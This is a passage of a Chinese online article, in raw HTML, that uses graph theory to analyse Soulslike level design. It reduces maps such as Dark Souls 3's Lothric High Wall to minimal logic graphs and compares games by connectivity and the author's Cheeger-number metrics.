1)若这个邻边的集合当中存在全连通键，则缩并全部的全连通键。</p>\n<p>       2)执行<b>5. 1)</b>后，对于新的邻边集合，若存在相邻两边属于同一类型的不动键，则将两不动键缩并为一根同样类型的不动键，反复迭代直到该邻边集合当中不存在相邻的同类型不动键。</p>\n<p>6.经过操作5得到的新图结构，考察与 <img src=\"https://www.zhihu.com/equation?tex=C_0\" alt=\"C_0\" eeimg=\"1\"> 具有邻边的极大环 <img src=\"https://www.zhihu.com/equation?tex=C_%7Bmax%7D\" alt=\"C_{max}\" eeimg=\"1\"> 和其他极小环 <img src=\"https://www.zhihu.com/equation?tex=C_1+%5Csim+C_n\" alt=\"C_1 \\sim C_n\" eeimg=\"1\"> ，若 <img src=\"https://www.zhihu.com/equation?tex=C_i\" alt=\"C_i\" eeimg=\"1\"> 与 <img src=\"https://www.zhihu.com/equation?tex=C_0\" alt=\"C_0\" eeimg=\"1\"> 的邻边数目等于1，且该边为全连通键，则缩并该键，除非违反规则2。</p>\n<p><b>7.</b>反复执行上述规则 <img src=\"https://www.zhihu.com/equation?tex=3+%5Csim+6\" alt=\"3 \\sim 6\" eeimg=\"1\"> ，直到图结构不再变化。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>部分读者可能看这些规则有些眼晕了。我们在这里拿出一些具体例子来</p>\n<p>下面演示黑魂3的关卡：洛斯里克高墙。我们给出洛城高墙的自然逻辑图如下。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-51943ada9f5487671e5c065d43d59591_b.jpg\" data-size=\"normal\" data-rawwidth=\"1407\" data-rawheight=\"624\" class=\"origin_image zh-lightbox-thumb\" width=\"1407\" data-original=\"https://pic2.zhimg.com/v2-51943ada9f5487671e5c065d43d59591_r.jpg\"><figcaption>洛斯里克高墙自然逻辑图</figcaption></figure><p> 首先，根据既约规则4，图中存在5条自由键——离塔篝火、吸魂鬼支线、小偷支线以及两个Boss冰狗和舞娘。</p>\n<p>作为第一步，我们将这五条键缩并为一点，命名规则按照规则3，得到</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a72960709b0afb03d62ab2e7eb9444d4_b.jpg\" data-size=\"normal\" data-rawwidth=\"1248\" data-rawheight=\"665\" class=\"origin_image zh-lightbox-thumb\" width=\"1248\" data-original=\"https://pic1.zhimg.com/v2-a72960709b0afb03d62ab2e7eb9444d4_r.jpg\"><figcaption>洛斯里克高墙对自由键缩并的结果</figcaption></figure><p> 此时，可以看到图结构的极大环已经不存在重边了。</p>\n<p>仔细观察上图，可以发现，图结构当中存在4个极小环。同时，极小环与极大环的邻边当中，有如下图所示的两条长链具有多条“冗余”的全连通键。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-2c2c7d01a0213aa87cadda659a912ee0_b.jpg\" data-size=\"normal\" data-rawwidth=\"1561\" data-rawheight=\"832\" class=\"origin_image zh-lightbox-thumb\" width=\"1561\" data-original=\"https://pic1.zhimg.com/v2-2c2c7d01a0213aa87cadda659a912ee0_r.jpg\"><figcaption>红色圆圈标识出来的两条长链内，含有多条“冗余”的全连通键</figcaption></figure><p>  再注意到图结构中存在高墙一火、离塔篝火、Boss点三个不动点。根据既约规则5，一个简单的缩并思路是，将“洛骑塔”、“人脓屋顶”两个开放区域与离塔篝火区域合并。活尸小路、人脓塔与高墙一火区域合并。Boss点与羽翼骑士广场区域合并。由此进行线型缩并之后。得到新的结构为</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-4b45857a6119c1aef5afa2540b4209eb_b.jpg\" data-size=\"normal\" data-rawwidth=\"1193\" data-rawheight=\"669\" class=\"origin_image zh-lightbox-thumb\" width=\"1193\" data-original=\"https://pic4.zhimg.com/v2-4b45857a6119c1aef5afa2540b4209eb_r.jpg\"><figcaption>对两条长链，根据既约规则5进行缩并，得到的新结构</figcaption></figure><p>  根据既约规则6，观察图结构。图中共有4个极小环，其中，3个是三顶环且具有不动键，因此无法缩并。一个是四顶环，但是倘若要去掉任意一键时，要么删去不动键，要么破坏其他极小环的结构，这两种操作分别被规则2和规则3所禁止，是“非法(Illegal)”的。因此，这个图结构已经是最简逻辑图了。我们稍作整理，有</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-31fddde92474bc696bcd1f3bc157ff4a_b.jpg\" data-size=\"normal\" data-rawwidth=\"957\" data-rawheight=\"840\" class=\"origin_image zh-lightbox-thumb\" width=\"957\" data-original=\"https://pic3.zhimg.com/v2-31fddde92474bc696bcd1f3bc157ff4a_r.jpg\"><figcaption>黑魂3关卡：洛斯里克高墙的最简逻辑图</figcaption></figure><p>最简逻辑图能够让我们更加清晰的理顺关卡的逻辑结构。从上图可以看出，整个关卡，洛斯里克高墙事实上由四个极小环构成。</p>\n<p>一个四点环，从高墙一火起始，途经飞龙塔、离塔篝火，直到洛城中央广场的Boss为止，这一条是游戏流程的主干。</p>\n<p>三个三点环，分别分支出“望远镜”、“宝箱怪”、“元素碎片”三个小的环路区域，在这三个区域正如字面意义上的，可以拿到强力道具、武器和素材</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>接下来，我们将在3.4小节证明，在这套<b>最简缩并既约规则</b>的同伦变换下，得到的最简逻辑图具有唯一性。</p>\n<p>这里声明一下，为了保证来源复杂的读者群体，都能够完整的读懂本文构建的理论体系，笔者一直试图减少数学推论和公式的使用，尽量用图例来解释说明。但是接下来的证明，无论如何都需要使用大量的数学工具。因此，笔者建议对数学证明过程不感兴趣的读者直接跳过下一小节，直接进入3.5节“关卡逻辑图小结”的阅读。您只需记住这样一个结论即可：对于任意一张地图，在既约规则的化简下，有且只有一张最简逻辑图与之对应。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>*同伦变换唯一性的数学证明</h3>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-bcd23e6ad05ada4e72a1f3d32c0df2c4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1323\" data-rawheight=\"1871\" class=\"origin_image zh-lightbox-thumb\" width=\"1323\" data-original=\"https://pic1.zhimg.com/v2-bcd23e6ad05ada4e72a1f3d32c0df2c4_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-b692de8c518c60f49bbb45453facd29b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1323\" data-rawheight=\"1871\" class=\"origin_image zh-lightbox-thumb\" width=\"1323\" data-original=\"https://pic4.zhimg.com/v2-b692de8c518c60f49bbb45453facd29b_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-dc9d6412c2a4514fdfeadcc931f03fc9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1323\" data-rawheight=\"1871\" class=\"origin_image zh-lightbox-thumb\" width=\"1323\" data-original=\"https://pic2.zhimg.com/v2-dc9d6412c2a4514fdfeadcc931f03fc9_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-43bee075db247d9392e2695675f1053b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1323\" data-rawheight=\"1871\" class=\"origin_image zh-lightbox-thumb\" width=\"1323\" data-original=\"https://pic4.zhimg.com/v2-43bee075db247d9392e2695675f1053b_r.jpg\"></figure><h3>关卡逻辑图小结</h3>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>这里，我们做一个小结:</p>\n<p>当我们画出“自然逻辑图”时，其实我们已经简化掉了关卡中的许多要素——引导、美术、地形等等。我们就如同当年欧拉在解决“七桥问题”时候做的那样，甚至与连地图当中的几何要素——距离，都被模糊了。在自然逻辑图中，我们并不能直接读出，从一个开放区域到达下一个开放区域的物理距离是多少。我们唯一留下的，就是两个区域之间的“逻辑关系”。</p>\n<p>更进一步的，当我们从自然逻辑图化简到更抽象的最简逻辑图时，其实地图当中“开放区域”和 “路径”这种概念都已经被模糊掉了。此时，图结构当中，唯一不变的，只有同伦变换下，依然并保持原样的不动点和不动键。</p>\n<p>这种简化和抽象，是否过头了呢？笔者并不这样认为。原因在于，对于一个模型、或者说理论而言，越是抽象，通性和普遍性才能从复杂的表象当中显露出来</p>\n<p>我们不妨去移情一下，一个玩家当他完全探索开启了整个关卡地图之后，他对于地图整体结构的把握主要源于哪些定标？</p>\n<p>一个合理的想象是，玩家是不可能记住地图各个开放区域之间的具体的距离是多少，他可能有个大概的距离的估测，但这个距离的估测，也是由“途中经过多少个开放区域”这种方法来记住的，绝不可能是依靠对于物理距离的测算——除非他直接解包游戏文件，否则在流程内，这件事情是办不到的</p>\n<p>这也是我们想要去诠释的一个方向——就是玩家在游玩关卡之后的<b>满足感</b>。</p>\n<p>在玩家刚刚探索完一个关卡之后，他对于的关卡内可游玩要素的印象还很新鲜，这个时候我们认为，正是由本文的“自然逻辑图”去概述玩家对整体游戏流程的把握。玩家依然会记得各个开放区域内有趣的“POI”，他们会在脑海内建构这些区域之间的联系。他们可能不会画出来，但是关卡的结构，一定已经以一种模糊的、直感的方式被潜意识所记住。正因如此，在玩家的高周目流程中，他们才可以更快的完成关卡探索。</p>\n<p>而至于“最简逻辑图”呢？这个图结构可就更抽象了，所有的兴趣点都被抽象掉，只剩下最骨干的不动点和不动键支撑着玩家对游戏关卡流程的记忆。一个合理的解释是，这是玩家在初次游玩该关卡很久很久之后，再次提起该关卡时的记忆模式。初见时期捷径的打开，是如此的令人印象深刻，以至于在长时间的闲置之后，老玩家依然需要利用存档点、Boss点和捷径去锚定关卡区域，而期间的游戏流程，尽管有趣，但是在对关卡整体结构的记忆中已经消逝在角落里。</p>\n<p>所以我们讲，玩家不一定是懂得图论的，或者说，一个策划也不应该期待玩家懂得这些，但这不代表利用图论去分析研究关卡结构就是无效的。玩家可能不会用图论的语言去描述一个关卡给他们的感受，但也不代表他们在记忆他们的心流体验时，不会用“点”、“线”、“环”这些简单的图结构去记忆。而一个策划最重要的任务，恰恰是要让玩家说出他们想说但说不出口的话，让玩家做到他们想做但是做不到的事。为了达成这一点，策划们需要一些更多的“语言”，这种语言可以是镜头语言、肢体语言，可以是一个优秀的系统、战斗机制或游戏玩法，当然也可以像本文一样，是一种利用图论去表述关卡设计的“语言”。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>图结构的稳定性</h2>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>图的连通度</h3>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>在第三章，我们对前人的工作进行了扬弃，最简逻辑图的建立，让我们得以将任意一个箱庭式关卡内部的逻辑关系，唯一的对应于一个纯粹的数学结构。从第四章开始，我们的任务，就是分析这些最简逻辑图，找出那个最适合的用于评价地图好坏的“观测量”</p>\n<p>在这里，我们需要介绍图论里，用于衡量图结构的一个重要概念：连通度</p>\n<p><b>连通度(Connectivity)</b></p>\n<p>定义：对于一张图 <img src=\"https://www.zhihu.com/equation?tex=G\" alt=\"G\" eeimg=\"1\"> ，若去掉其中任意 <img src=\"https://www.zhihu.com/equation?tex=k-1\" alt=\"k-1\" eeimg=\"1\"> 个点之后，剩下的子图依然是连通图；且存在一种 <img src=\"https://www.zhihu.com/equation?tex=k\" alt=\"k\" eeimg=\"1\"> 个点的取法，使得去掉该 <img src=\"https://www.zhihu.com/equation?tex=k\" alt=\"k\" eeimg=\"1\"> 个点之后，剩下的子图是非连通图。此时，我们称该图 <img src=\"https://www.zhihu.com/equation?tex=G\" alt=\"G\" eeimg=\"1\"> 的连通度为 <img src=\"https://www.zhihu.com/equation?tex=k\" alt=\"k\" eeimg=\"1\"> 。并且我们称这 <img src=\"https://www.zhihu.com/equation?tex=k\" alt=\"k\" eeimg=\"1\"> 个点为图 <img src=\"https://www.zhihu.com/equation?tex=G\" alt=\"G\" eeimg=\"1\"> 的 <img src=\"https://www.zhihu.com/equation?tex=k\" alt=\"k\" eeimg=\"1\"> 个“驻点”。</p>\n<p>举例：我们不妨考虑下面这样一张被投影到平面上的正四棱锥。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-5f937c3af75df9cabb0eb6309d9433ff_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"426\" data-rawheight=\"381\" class=\"origin_image zh-lightbox-thumb\" width=\"426\" data-original=\"https://pic4.zhimg.com/v2-5f937c3af75df9cabb0eb6309d9433ff_r.jpg\"></figure><p>如上图所示,是5个点8条键构成的正四棱锥图结构</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d1336bdab7044ddfe34f31e87c6328bd_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"870\" data-rawheight=\"346\" class=\"origin_image zh-lightbox-thumb\" width=\"870\" data-original=\"https://pic2.zhimg.com/v2-d1336bdab7044ddfe34f31e87c6328bd_r.jpg\"></figure><p>原图删去1个点，有2种非平庸的删除方案，2种方案得到的子图都是连通图</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-8184b09cddc15a2aff8c332f2e1573c5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1258\" data-rawheight=\"358\" class=\"origin_image zh-lightbox-thumb\" width=\"1258\" data-original=\"https://pic2.zhimg.com/v2-8184b09cddc15a2aff8c332f2e1573c5_r.jpg\"></figure><p>原图删去2个点，有3种非平庸的删除方案，3种方案得到的子图都是连通图</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-199c18b2be37dcce51608e0face1a7fc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"404\" data-rawheight=\"353\" class=\"content_image\" width=\"404\"></figure><p>原图删去3个点，在我们删去1、3、5号点时，图结构变为非连通图。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>综上，正四棱锥图的连通度为3。</p>\n<p>连通度是干什么用的呢？它的主要作用是衡量一张图的“稳定性”(For Expert:鲁棒性，Robustness)。连通度越高，说明地图的连通性越难以被破坏，即去掉一些点之后，这张图依然可以是一张连通图。</p>\n<p>拿出我们3.1节举例的三张自然逻辑图的地图，可以简单的看出，三张图的连通度分别是1，2，2</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-8a6780aa2c88ccd9c18606e021c4ea77_b.jpg\" data-size=\"normal\" data-rawwidth=\"2721\" data-rawheight=\"625\" class=\"origin_image zh-lightbox-thumb\" width=\"2721\" data-original=\"https://pic4.zhimg.com/v2-8a6780aa2c88ccd9c18606e021c4ea77_r.jpg\"><figcaption>恶鬼栖息之岛、幽邃教堂、伊瑟流姆三张地图的自然逻辑图，简单的验证可以得到，三个图结构的连通度分别是1，2，2</figcaption></figure><p>  我们直接列出《黑暗之魂1》、《黑暗之魂3》、《血源诅咒》、《仁王1》、《帕斯卡契约》五款游戏全关卡最简逻辑图的连通度计算结果。(注：各个地图的最简逻辑图请见附录)</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-bd3079b0d00b3f3ad40b0181d56e187f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1323\" data-rawheight=\"1871\" class=\"origin_image zh-lightbox-thumb\" width=\"1323\" data-original=\"https://pic4.zhimg.com/v2-bd3079b0d00b3f3ad40b0181d56e187f_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-90124a5626150fe9a240dd3da97aa78f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1323\" data-rawheight=\"1871\" class=\"origin_image zh-lightbox-thumb\" width=\"1323\" data-original=\"https://pic4.zhimg.com/v2-90124a5626150fe9a240dd3da97aa78f_r.jpg\"></figure><p>这么长的表大概把读者眼睛都看花了，我们做一个简单的统计吧。</p>\n<ul><li><i>五款类魂游戏，连通度为1和2的关卡，对各自游戏总关卡数目占比一览表。</i></li></ul>\n<table data-draft-node=\"block\" data-draft-type=\"table\" data-size=\"normal\" data-row-style=\"normal\"><tbody>\n<tr>\n<th></th>\n<th>魂1</th>\n<th>魂3</th>\n<th>仁王1</th>\n<th>血源</th>\n<th>帕斯卡</th>\n</tr>\n<tr>\n<td>连通度为1</td>\n<td>23.1%</td>\n<td>35.7%</td>\n<td>100.0%</td>\n<td>31.3%</td>\n<td>40.0%</td>\n</tr>\n<tr>\n<td>连通度为2</td>\n<td>76.9%</td>\n<td>64.3%</td>\n<td>0.0%</td>\n<td>68.8%</td>\n<td>60.0%</td>\n</tr>\n</tbody></table>\n<p>事实上，在这一步，就可以看出，仁王的地图设计其实出现了比较大的问题——所有的的仁王地图连通度都是1 。。。这里补充一点，一张正常设计的地图，它的连通度最低就是1——这保证了该地图是一张连通图。如果一张地图甚至不是连通图，那么说明它的地图存在一个部分的区域，被设计者设计好了，但是玩家无论如何都无法在游戏流程内到达...这是不敢想象的。</p>\n<p>连通度为2，体现在游戏里，主要表现在玩家完整探索地图之后，仍能够回到初始的篝火点。</p>\n<p>读者不妨仔细想一想，黑魂的地图设计，可以诠释为“局部的开放性探索+整体的回溯式探索相结合”，在游戏开始到游戏中期，地图可探索区域解锁速度非常快(恶魂五座石碑，魂1初始地点火祭场连接了五个大型可探索区域，魂3在活祭品之路后地图分叉、血源大教堂区连接了四个其他大区域，只狼到达苇名主城后可以去三个其他区域。)。在中期到后期，则倾向于收拢、回到初始之地(这个是最明显的，除了魂2之外其他的“魂类”五部作品——恶魂、魂1、魂3、血源、只狼，它的最终Boss战都和出生点只有一步之遥，恶魂和魂1的都在祭祀场正下方，魂3是火祭场原地tp，血源猎人的梦境后院，只狼是在暗道前，教学关卡被剧情杀的位置。)</p>\n<p>玩过仁王的玩家不妨再仔细考量一下，仁王的地图关卡，是否有哪张图，探索结束之后可以开启近路回到第一个神社处呢？很遗憾，答案是，没有，没有任何一张地图满足这个条件。我们看仁王1各个地图，其实它的环边比 <img src=\"https://www.zhihu.com/equation?tex=l%2Fe\" alt=\"l/e\" eeimg=\"1\"> 一般都不低，基本徘徊在0.5左右。说明仁王1地图的成环数目其实不差，平均每两条路径就能成一环路。问题在于仁王1地图的连通度太低。也就是说，成环的“质量(Quality)”比较低，全都是局域性的小环路，没有全局性的大环路。</p>\n<p>所以说，仁王的关卡设计，我们可以称之为“整体线性，局部回溯式探索”。</p>\n<p>我们拿出一张仁王的地图、自然逻辑图和最简逻辑图出来看一下</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-98c8823d27ff7f03aad246fab85a43f7_b.jpg\" data-size=\"normal\" data-rawwidth=\"1561\" data-rawheight=\"860\" class=\"origin_image zh-lightbox-thumb\" width=\"1561\" data-original=\"https://pic4.zhimg.com/v2-98c8823d27ff7f03aad246fab85a43f7_r.jpg\"><figcaption>比睿山的魔物原始地图</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-697e9de443bfba30f5659a225d55b1b4_b.jpg\" data-size=\"normal\" data-rawwidth=\"1562\" data-rawheight=\"581\" class=\"origin_image zh-lightbox-thumb\" width=\"1562\" data-original=\"https://pic1.zhimg.com/v2-697e9de443bfba30f5659a225d55b1b4_r.jpg\"><figcaption>比睿山的魔物自然逻辑图</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-46102a4bdcf00dc3d8ff45f958b96236_b.jpg\" data-size=\"normal\" data-rawwidth=\"891\" data-rawheight=\"549\" class=\"origin_image zh-lightbox-thumb\" width=\"891\" data-original=\"https://pic3.zhimg.com/v2-46102a4bdcf00dc3d8ff45f958b96236_r.jpg\"><figcaption>比睿山的魔物最简逻辑图</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-7e9cc71c0161c70157d0eed49a946867_b.jpg\" data-size=\"normal\" data-rawwidth=\"821\" data-rawheight=\"675\" class=\"origin_image zh-lightbox-thumb\" width=\"821\" data-original=\"https://pic4.zhimg.com/v2-7e9cc71c0161c70157d0eed49a946867_r.jpg\"><figcaption>整理后的比睿山的魔物最简逻辑图</figcaption></figure><p>可以看到，仁王的设计思路是这样的——局部的优秀小关卡，然后用甬道将小关卡顺次连接起来。</p>\n<p>这就是我们讲，它事实上整体结构依然是线性的，局域的小回路固然有助于加强游戏的有趣性，但是对地图整体结构在玩家脑内的形成是没有帮助的。仔细观察最简逻辑图，3个驻点将整张地图事实上的划分成了4个区块。也就是说，仁王的地图是“整体上的线性”。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-fd38afeb4c94503192174c8a7717ab13_b.jpg\" data-size=\"normal\" data-rawwidth=\"999\" data-rawheight=\"863\" class=\"origin_image zh-lightbox-thumb\" width=\"999\" data-original=\"https://pic4.zhimg.com/v2-fd38afeb4c94503192174c8a7717ab13_r.jpg\"><figcaption>比睿山的魔物最简逻辑图，3个驻点已经使用红色箭头标出</figcaption></figure><p>分析到这里，其实也差不多了，连通度是一个很有效的量，但是对于本文来说，它依然不够精确——正如玩家所见，几乎所有的地图连通度都是1，这里就缺乏了区分度。仁王的大部分地图在这一步受到了批判，但是更多的地图，尽管他们的连通度都是1，显然他们之间依然有区别。对于连通度而言，1就是1，2就是2，没有中间值。我们需要一个更进一步的量，一个更加连续的、不是像连通度这样分立的量。这个时候，图的 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数就进入了我们的视野。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>图的Cheeger数</h3>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>我们先给出标准的数学定义</p>\n<p>对于具有 <img src=\"https://www.zhihu.com/equation?tex=m\" alt=\"m\" eeimg=\"1\"> 个顶的图 <img src=\"https://www.zhihu.com/equation?tex=G\" alt=\"G\" eeimg=\"1\"> ，若存在 <img src=\"https://www.zhihu.com/equation?tex=n\" alt=\"n\" eeimg=\"1\"> 种取法，使得删掉其中的 <img src=\"https://www.zhihu.com/equation?tex=k\" alt=\"k\" eeimg=\"1\"> 个顶之后的子图是非连通图。则称，该图 <img src=\"https://www.zhihu.com/equation?tex=G\" alt=\"G\" eeimg=\"1\"> 的 <img src=\"https://www.zhihu.com/equation?tex=k\" alt=\"k\" eeimg=\"1\"> 阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数 <img src=\"https://www.zhihu.com/equation?tex=%5Clambda_k\" alt=\"\\lambda_k\" eeimg=\"1\"> 为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Clambda_k+%3D+1+-+%5Cfrac%7Bn%7D%7BC%5E%7Bk%7D_%7Bm%7D%7D+\" alt=\"\\lambda_k = 1 - \\frac{n}{C^{k}_{m}} \" eeimg=\"1\"></p>\n<p>其中 <img src=\"https://www.zhihu.com/equation?tex=C%5E%7Bk%7D_%7Bm%7D\" alt=\"C^{k}_{m}\" eeimg=\"1\"> 代表 <img src=\"https://www.zhihu.com/equation?tex=%28k%2Cm%29\" alt=\"(k,m)\" eeimg=\"1\"> 的组合数。</p>\n<p>对数学不敏感的读者，不要怕，笔者马上来解释。</p>\n<p>在连通度的定义当中，我们要对一张连通图删去 <img src=\"https://www.zhihu.com/equation?tex=k-1\" alt=\"k-1\" eeimg=\"1\"> 个点，如果任意取这 <img src=\"https://www.zhihu.com/equation?tex=k-1\" alt=\"k-1\" eeimg=\"1\"> 个点，都不能破坏图的连通性，而取到 <img src=\"https://www.zhihu.com/equation?tex=k\" alt=\"k\" eeimg=\"1\"> 个点时可以破坏连通性，这个时候可以定义连通度为 <img src=\"https://www.zhihu.com/equation?tex=k\" alt=\"k\" eeimg=\"1\"> 。</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数实际上就是对这个概念的“放宽”。我们不再要求“一定”不能破坏连通性，而是去分析那些破坏性的取法与总取法的一个占比。</p>\n<p>譬如我们对下面这张连通图，只删去一个点，它的 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数是多少呢？</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-617e3e38dbf6e2bc3b600f25ed926155_b.jpg\" data-size=\"normal\" data-rawwidth=\"209\" data-rawheight=\"327\" class=\"content_image\" width=\"209\"><figcaption>一个简单的计算Cheeger数的例子</figcaption></figure><p> 可以看到，因为一共有5个点，所以显然有5种删点方案，其中没有任何一种导致图的连通性崩溃，因此得出图的“1阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数”为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Clambda_1+%3D+1+-+%5Cdfrac%7B0%7D%7BC%5E%7B1%7D_%7B5%7D%7D+%3D+1+\" alt=\"\\lambda_1 = 1 - \\dfrac{0}{C^{1}_{5}} = 1 \" eeimg=\"1\"></p>\n<p>类比之，假如我们要删掉2个点呢？有且只有两种删法会使得图的连通性崩溃——分别是，删掉(2，3)两个点(注：以后用小括号标识的点我们称为“点对”)，以及删掉(3，4)点对。因此有</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Clambda_2+%3D+1+-+%5Cdfrac%7B2%7D%7BC%5E%7B2%7D_%7B5%7D%7D+%3D+0.8+\" alt=\"\\lambda_2 = 1 - \\dfrac{2}{C^{2}_{5}} = 0.8 \" eeimg=\"1\"></p>\n<p>读者不妨验证一下，其他删法都不能破坏连通性。</p>\n<p>同样的，假如我们要删掉3个点呢？有三种删法会使得图的连通性崩溃——分别是删掉(1，3，4)、(2，3，4)、(2，3，5)这些点对，共计三种删除方法(读者不妨自行验证其他删法不能破坏连通性)。此时有</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Clambda_3+%3D+1+-+%5Cdfrac%7B3%7D%7BC%5E%7B3%7D_%7B5%7D%7D+%3D+0.7+\" alt=\"\\lambda_3 = 1 - \\dfrac{3}{C^{3}_{5}} = 0.7 \" eeimg=\"1\"></p>\n<p>读者朋友可以看到，通过这样算比例的方式，我们就比较直观的将原先高度分立、只能是自然数的“连通度”变成了许多连续的“ <img src=\"https://www.zhihu.com/equation?tex=k\" alt=\"k\" eeimg=\"1\"> 阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数”。</p>\n<p>我们不妨将我们研究的五款游戏各个关卡的 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数也算出来，制成表格。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-84af50b1d1f255f87f62268f50c47fc7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1323\" data-rawheight=\"1871\" class=\"origin_image zh-lightbox-thumb\" width=\"1323\" data-original=\"https://pic4.zhimg.com/v2-84af50b1d1f255f87f62268f50c47fc7_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-10452ad4c5082a3e181b99f7891a3157_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1323\" data-rawheight=\"1871\" class=\"origin_image zh-lightbox-thumb\" width=\"1323\" data-original=\"https://pic4.zhimg.com/v2-10452ad4c5082a3e181b99f7891a3157_r.jpg\"></figure><p>为什么我们的 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数只算到三阶呢？因为平面上最简单的成环结构——三角形的顶点数是3，我们在化简自然逻辑图的时候，也尽量将最简逻辑图当中的极小环向三顶环的方向去化简。考虑到三阶以上的图结构也很难被设计者考虑进去了，我们认为取到三阶为止是合理的。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>从表中，对数字比较敏锐的读者可能已经看出端倪——一些被大量玩家群体公认设计的好的地图，包括但不限于魂1全流程、魂1绘画世界、大书库、亚楠城、塞恩古城、地下墓地、研究大厅、幽邃教堂、帕斯卡的圣塔等等。这些地图往往1、2、3阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数都比较高。</p>\n<p>但是， <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数依然不符合我们对观测量的需求，我们希望找到“一个连续的观测量”。连通度是一个量，但不是连续的； <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数是连续的，但不是一个量，有好多阶的数值。为了整合两种方案之优势，我们即将进行最终的观测量构建。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>图的稳定因子</h3>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>如何将多个阶数的 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数统合为一个数？我们要求任一阶的图结构，都能在这个最终的观测量里体现出自己的价值，并且，不同阶数的 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 值互不影响，相互独立。满足的上述条件的一个最自然的方案，就是对不同阶数的 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数进行线性组合。如下：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cgamma+%3D+a_1+%5Clambda_1+%2B+a_2+%5Clambda_2+%2B+a_3+%5Clambda_3+%2B+...\" alt=\"\\gamma = a_1 \\lambda_1 + a_2 \\lambda_2 + a_3 \\lambda_3 + ...\" 